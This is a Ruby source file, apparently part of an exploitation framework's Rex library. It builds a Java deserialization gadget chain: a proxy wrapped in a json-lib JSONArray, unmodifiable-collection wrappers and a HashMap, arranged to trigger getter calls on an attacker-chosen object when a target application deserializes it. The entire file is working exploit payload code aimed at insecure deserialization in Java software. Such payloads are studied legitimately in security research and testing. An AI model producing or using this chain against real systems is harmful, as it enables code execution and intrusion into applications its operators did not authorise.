# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class JSON
          # this payload normally is not of much use
          # it has a lot of dependencies, many of which contain gadgets as well
          def make_getter_caller(obj, cls)
            # this proxy prevents invoking getters that cause exception
            # before we get to the interesting ones
            invh = Payloads::Util.delegateproxy(obj)
            proxy = Model::JavaProxy.new([cls[1..-2].tr('/', '.')], invh)

            inner = [
              Model::JavaObject.new('Ljava/util/AbstractMap$SimpleEntry;', 
                                    'key' => nil,
                                    'value' => proxy)
            ]

            ja = Model::JavaObject.new('Lnet/sf/json/JSONArray;', 
                                       'elements' => Model::JavaObject.new('Ljava/util/ArrayList;', 
                                                                           'elements' => inner))

            c1 = Model::JavaObject.new('Ljava/util/Collections$UnmodifiableMap$UnmodifiableEntrySet;', 
                                       'c' => ja)

            c2 = Model::JavaObject.new('Ljava/util/Collections$UnmodifiableSet;',
                                                 'c' => ja)

            Model::JavaObject.new('Ljava/util/HashMap;', 
                                  'elements' => { c2 => nil, c1 => nil })
          end
        end
      end
    end
  end
